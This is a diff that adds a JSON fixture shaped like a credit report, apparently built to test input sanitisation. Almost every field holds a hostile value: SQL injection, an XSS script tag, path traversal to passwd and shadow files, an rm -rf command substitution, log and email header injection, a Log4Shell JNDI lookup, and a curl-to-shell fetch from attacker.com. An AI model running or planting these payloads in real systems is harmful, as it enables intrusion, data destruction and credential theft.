@@ -1,0 +1,57 @@
+{
+  "report_id": "CR-2025-666'; DROP TABLE reports; --",
+  "report_date": "2025-01-15T10:30:00Z",
+  "bureau": "Malicious Bureau<script>alert('XSS')</script>",
+  "subject": {
+    "ssn": "../../../etc/passwd",
+    "name": "Robert'; DELETE FROM users WHERE '1'='1",
+    "dob": "1985-03-15",
+    "address": "$(rm -rf /tmp/*)",
+    "phone": "555-123-4567\n\nINJECTED LOG ENTRY",
+    "email": "attacker@evil.com\r\nBcc: everyone@company.com"
+  },
+  "credit_score": {
+    "score": 999999,
+    "model": "FICO 8",
+    "date": "2025-01-15",
+    "factors": [
+      "Payment history is ${env:ADMIN_PASSWORD}",
+      "Credit utilization is ${jndi:ldap://attacker.com/exploit}"
+    ]
+  },
+  "accounts": [
+    {
+      "account_id": "../../../../etc/shadow",
+      "creditor": "Bank of Example\n\n[FAKE LOG] Admin logged in successfully",
+      "type": "credit_card",
+      "status": "open",
+      "opened": "2020-05-10",
+      "balance": -999999999,
+      "credit_limit": 999999999,
+      "payment_status": "current\n\nERROR: System compromised",
+      "payment_history": "Never late"
+    }
+  ],
+  "inquiries": [
+    {
+      "date": "2024-12-01",
+      "creditor": "Auto Finance Corp\"; os.system('curl attacker.com/steal.sh | sh'); #",
+      "type": "hard",
+      "purpose": "Auto loan application"
+    }
+  ],
+  "public_records": [],
+  "collections": [],
+  "summary": {
+    "total_accounts": 1,
+    "open_accounts": 1,
+    "closed_accounts": 0,
+    "total_balance": -999999999,
+    "available_credit": 999999999,
+    "credit_utilization": -99.99,
+    "derogatory_marks": 0,
+    "total_inquiries": 1,
+    "hard_inquiries": 1,
+    "oldest_account_age_years": 999
+  }
+}
